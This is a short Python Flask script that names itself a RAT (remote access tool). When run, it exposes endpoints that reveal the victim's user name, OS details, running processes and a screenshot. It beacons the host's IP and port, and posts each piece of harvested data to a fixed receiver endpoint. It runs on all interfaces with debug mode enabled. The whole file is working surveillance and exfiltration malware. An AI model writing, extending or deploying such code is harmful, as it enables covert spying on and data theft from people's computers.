from flask import Flask, jsonify, request, send_file
import requests, os, getpass, platform, psutil, mss, socket

app = Flask("There is a RAT on your machine")
PREDEFINED_ENDPOINT = "http://0.0.0.0:8080/receiver"

@app.route("/")
def root():
    endpoints = {
        "/user": "user information",
        "/os": "os details",
        "/proc": "list processes",
        "/shutdown": "shutdown",
    }
    return jsonify(endpoints)


@app.route("/user")
def user_info():
    user_info = {
        "user_name": getpass.getuser(),
    }
    requests.post(PREDEFINED_ENDPOINT, json={"user_info": user_info})
    return jsonify(user_info)


@app.route("/os")
def os_info():
    os_info = {
        "os_name": os.name,
        "platform_system": platform.system(),
        "platform_release": platform.release(),
    }
    requests.post(PREDEFINED_ENDPOINT, json={"os_info": os_info})
    return jsonify(os_info)


@app.route("/proc")
def proc_info():
    proc_info = [p.info for p in psutil.process_iter(["pid", "name"])]
    requests.post(PREDEFINED_ENDPOINT, json={"proc_info": proc_info})
    return jsonify(proc_info)


@app.route("/screen")
def make_screen():
    with mss.mss() as sct:
        sct.shot(output="screen.png")
    return send_file("screen.png", mimetype="image/png")


if __name__ == "__main__":
    def find_free_port():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            return s.getsockname()[1]

    port = find_free_port()
    ip = socket.gethostbyname(socket.gethostname())
    requests.post(PREDEFINED_ENDPOINT, json={"status": "online", "ip": ip, "port": port})
    app.run(host="0.0.0.0", port=port, debug=True)
